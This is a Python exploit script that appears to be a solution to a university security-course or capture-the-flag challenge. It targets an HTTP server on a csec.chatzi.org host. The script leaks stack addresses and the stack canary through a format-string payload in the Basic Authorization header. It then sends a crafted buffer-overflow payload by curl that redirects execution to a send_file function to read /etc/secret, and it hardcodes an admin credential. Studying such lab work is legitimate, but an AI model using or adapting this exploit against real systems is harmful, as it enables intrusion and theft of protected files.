
url =  "http://project-2.csec.chatzi.org:8000"
auth = "admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"

import subprocess
from requests import Request, Session
import base64
import time
import requests
import codecs

addr_last = None		# Previous value of ebp. Used to find the address of the buffer, with offset. 
addr_semi_last = None	# Used in order to find the address of the send_file function, with offset 
canary = None			# Canary value 
addr_3rd = None			# Used in order to find the original return address of post_param, within route



#Input is an address as an integer. Output is the address in little endian (in binary format)
# \x00 is replaced with \x26 
def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		# if int(b) == 26 or int(b) == 61:
		# 	print("Probably error")
		if int(b) != 0:
			mystring += '%c' % int(b)
		else:
			mystring += '%c' % 0x26			# if b is \0, replace it with &
	return mystring


# Find the value of the variables by using the formatted string attack
def set_variables():
	global addr_last
	global addr_semi_last
	global canary
	global addr_3rd

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	tokenized_result = response.headers['WWW-Authenticate'][13:-1].split(' ')


	addr_last = int(tokenized_result[-1],16)		#last
	addr_semi_last = int(tokenized_result[-2],16)	#second last
	canary = int(tokenized_result[-4],16)			#4th last
	addr_3rd = int(tokenized_result[4],16)			#3rd address

	time.sleep(0.5)

set_variables()

# Find the original values based on some stable offsets
buffer_address=addr_last - 0xB8	
send_file = addr_semi_last - 0x4f85 
route_address = addr_3rd - 0x1C7	# original return address of post_param, in route


# These variables will be placed in the stack in order for the program to terminate gracefully
#	after returning to route
old_ebp = addr_last
old_esi = 0xF7F31000 #It's going to be  overwritten, so its value doesn't matter
old_ebx = canary



# /etc/secret& | 80*! | param_name | 8*! | name | c | 4*! | p_post_data | value | canary | old_ebx | old_esi | old_ebp |send_file | route_address | buffer_address |'\0'| 
# As return of the send adress we store the original return address of post_param, so the execution of the program will be completed

filename = "/etc/secret&" 
data = filename 
data +=  80*"!" 
data += transform_address(buffer_address + 140 + 4) #param_name: pointer to '\0' 
data += 8*"!" + 4*"-" + 4*"-"+4*"!"					#name and c will be overwritten
data += transform_address(buffer_address)			#p_post_data points to the first '&'
data += 4*"-" 										#value will be overwritten
data += transform_address(canary)
data += transform_address(old_ebx) 
data += transform_address(old_esi) 
data += transform_address(old_ebp) 
data += transform_address(send_file) 				#Here we overwrite the ret. addr. of post_param
data += transform_address(route_address)			#Overwrite the return address of *send_file*
data += transform_address(buffer_address)			#send_file argument: pointer to /etc/secret
data += '\0'



#Store payload into a temporary binary file called mybin
binary_data = bytes(data, 'latin-1')
with open('mybin', 'wb') as file:
    file.write(binary_data)


curl_command =(
	"curl -m 5 -u"
	+ auth
	+" --data-binary '@mybin' "
	+ url
	+" -H 'Content-Length: 66'"
	)

try:
	result = subprocess.run(curl_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,check=True)
except subprocess.CalledProcessError:
	exit()

content = str(result.stdout)[84:-1] # Result of the instruction

decoded_output = codecs.escape_decode(content)[0].decode() # Decode binary characters

print(decoded_output)

